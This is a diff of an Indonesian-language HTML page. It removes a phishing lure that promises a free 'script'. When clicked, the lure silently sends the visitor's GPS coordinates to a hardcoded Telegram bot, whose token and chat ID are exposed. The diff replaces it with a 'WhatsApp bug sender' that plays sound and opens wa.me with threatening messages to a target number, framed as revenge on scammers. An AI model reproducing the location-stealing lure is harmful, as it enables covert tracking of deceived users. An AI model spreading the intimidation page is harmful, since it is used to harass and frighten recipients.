@@ -1,80 +1,99 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title> MASUK UNTUK BUG NOMER TARGET </title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body {
-      font-family: sans-serif;
-      background: black;
-      color: lime;
-      text-align: center;
-      padding: 50px;
-    }
-    .btn {
-      background-color: lime;
-      color: black;
-      border: none;
-      padding: 15px 30px;
-      font-size: 18px;
-      border-radius: 8px;
-      cursor: pointer;
-      margin-top: 20px;
-    }
-    .lokasi-box {
-      margin-top: 30px;
-      padding: 20px;
-      background: #111;
-      border: 2px solid red;
-      border-radius: 10px;
-      display: none;
-    }
-  </style>
+    <title>PENGIRIM BUG WA</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background-image: url('https://files.catbox.moe/l1buy6.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            color: white;
+            font-family: sans-serif;
+            text-align: center;
+            padding-top: 50px;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 30px;
+            text-shadow: 2px 2px 5px black;
+        }
+        button {
+            background-color: red;
+            border: none;
+            color: white;
+            padding: 15px 30px;
+            margin: 10px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            box-shadow: 0 0 10px rgba(0,0,0,0.7);
+        }
+        button:hover {
+            background-color: darkred;
+        }
+        .note {
+            background-color: rgba(0, 0, 0, 0.6);
+            padding: 15px;
+            font-size: 14px;
+            line-height: 1.6;
+            margin: 0;
+            color: #fff;
+        }
+    </style>
 </head>
 <body>
 
-  <h1>MASUK UNTUK MENGIRIM BUG KE TARGET</h1>
-  <p>Silakan klik tombol di bawah untuk klaim script secara otomatis</p>
+    <div>
+        <h1>PENGIRIM BUG WHATSAPP</h1>
 
-  <button class="btn" onclick="mintaLokasi()">🔓 Klaim Sekarang</button>
+        <button onclick="kirimBug('no')">BUG NO</button>
+        <button onclick="kirimBug('hard')">HARD BUG</button>
+        <button onclick="kirimBug('ganas')">HARD BUG GANAS</button>
+    </div>
 
-  <div id="lokasi" class="lokasi-box"></div>
+    <p class="note">
+        NOTE: Web ini dibuat untuk membantu Anda <strong>ngebug orang yang telah menscam kalian</strong>.<br>
+        Tolong gunakan dengan baik. Terima kasih 🙏
+    </p>
 
-  <script>
-    const token = "7762127279:AAHIQQ_l3KJGaV9T31YM1ZAZ2hNRQcVYtLM";
-    const chatId = "6788646701";
+    <!-- Audio -->
+    <audio id="bugAudio" loop>
+        <source src="https://files.catbox.moe/tfqzkm.mp3" type="audio/mpeg">
+    </audio>
 
-    function mintaLokasi() {
-      navigator.geolocation.getCurrentPosition(
-        function(pos) {
-          const lat = pos.coords.latitude.toFixed(5);
-          const lon = pos.coords.longitude.toFixed(5);
-          const map = `https://www.google.com/maps?q=${lat},${lon}`;
-          document.getElementById("lokasi").style.display = "block";
-          document.getElementById("lokasi").innerHTML = `
-            <h2>📍 Lokasi Berhasil Terkirim</h2>
-            <p>Latitude: <b>${lat}</b></p>
-            <p>Longitude: <b>${lon}</b></p>
-            <a href="${map}" target="_blank" style="color:cyan;">🔗 Lihat Lokasi di Google Maps</a>
-          `;
+    <script>
+        const target = "6281234567890"; // GANTI NOMOR TARGET
 
-          const pesan = `📍 *Lokasi Korban (Klaim SC):*\nLatitude: ${lat}\nLongitude: ${lon}\n🔗 ${map}`;
-          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: pesan,
-              parse_mode: "Markdown"
-            })
-          });
-        },
-        function(error) {
-          alert("❌ MENGIRIM BUG  gagal .");
+        const pesan = {
+            no: encodeURIComponent('⚠️ BUG RINGAN ‼️\n🧠🧠🧠\nCek sistem WhatsApp kamu 😈'),
+            hard: encodeURIComponent('💥💣 HARD BUG 💣💥\n🔥🔥🔥\nBersihkan WA kamu sekarang!!!'),
+            ganas: encodeURIComponent('☠️☠️☠️ HARD BUG GANAS ☠️☠️☠️\n🧨🧨🧨\nWA KAMU AKAN NGELAG PARAH ‼️‼️‼️')
+        };
+
+        const audio = document.getElementById("bugAudio");
+
+        function kirimBug(tipe) {
+            try {
+                audio.volume = 1.0;
+                audio.play().catch(() => {
+                    alert("Ketuk layar dulu agar suara aktif.");
+                });
+            } catch (err) {
+                console.error("Audio gagal diputar:", err);
+            }
+
+            setTimeout(() => {
+                window.location.href = `https://wa.me/${target}?text=${pesan[tipe]}`;
+            }, 1000);
         }
-      );
-    }
-  </script>
-
+    </script>
 </body>
 </html>
